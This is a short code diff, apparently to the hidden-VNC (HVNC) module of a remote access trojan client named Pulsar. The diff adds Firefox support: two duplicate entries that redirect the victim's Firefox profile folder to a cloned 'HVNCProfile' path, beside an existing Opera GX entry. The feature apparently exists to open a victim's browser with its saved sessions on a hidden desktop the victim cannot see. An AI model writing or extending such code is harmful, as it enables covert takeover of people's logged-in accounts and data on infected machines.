@@ -68,6 +68,22 @@ namespace Pulsar.Client.Helper.HVNC
                     SearchPattern = "Roaming\\Opera Software\\Opera GX Stable",
                     ReplacementPath = "Roaming\\Opera Software\\KDOT"
                 }
+            },
+            {
+                "Firefox", new BrowserConfig
+                {
+                    ExecutablePath = Path.Combine(Environment.GetEnvironmentVariable("PROGRAMFILES"), "Mozilla Firefox\\firefox.exe"),
+                    SearchPattern = "Roaming\\Mozilla\\Firefox\\Profiles",
+                    ReplacementPath = "Roaming\\Mozilla\\Firefox\\HVNCProfile"
+                }
+            },
+            {
+                "Mozilla", new BrowserConfig
+                {
+                    ExecutablePath = Path.Combine(Environment.GetEnvironmentVariable("PROGRAMFILES"), "Mozilla Firefox\\firefox.exe"),
+                    SearchPattern = "Roaming\\Mozilla\\Firefox\\Profiles",
+                    ReplacementPath = "Roaming\\Mozilla\\Firefox\\HVNCProfile"
+                }
             }
         };
 
